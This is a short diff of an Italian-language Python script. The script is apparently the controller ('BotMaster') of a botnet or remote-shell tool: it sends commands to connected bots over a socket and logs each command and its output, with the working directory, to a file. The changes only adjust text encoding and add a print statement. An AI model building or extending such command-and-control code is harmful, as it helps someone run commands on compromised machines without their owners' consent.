@@ -11,7 +11,7 @@ print('Il BotMaster con indirizzo IP:',serverName, 'e\' pronto a ricevere le inf
 def invia_messaggio(messaggio):
     global connectionSocket
     try:
-        connectionSocket.send(messaggio.encode())
+        connectionSocket.send(messaggio.encode('utf-8','ignore'))
         return True
     except Exception as e:
         #Il client si e' disconnesso nel mentre, tentiamo la riconnessione a un bot
@@ -35,7 +35,7 @@ def ricevi_stampa_messaggio():
 def ricevi_messaggio():
     global connectionSocket
     try:
-        messaggio = connectionSocket.recv(BUFFER_SIZE).decode()
+        messaggio = connectionSocket.recv(BUFFER_SIZE).decode('utf-8','ignore')
         return str(messaggio)
     except Exception as e:
         #Il client si e' disconnesso nel mentre, tentiamo la riconnessione a un bot
@@ -81,6 +81,7 @@ while True:
                     if (len(risultato)==2):
                         queryRes, cwd = output.split('<sep>')
                         f = open("Info.txt", "a")
+                        print(risultato)
                         f.write("Comando inviato: " + cmd)
                         f.write("\nRisultato:\n")
                         f.write (queryRes)
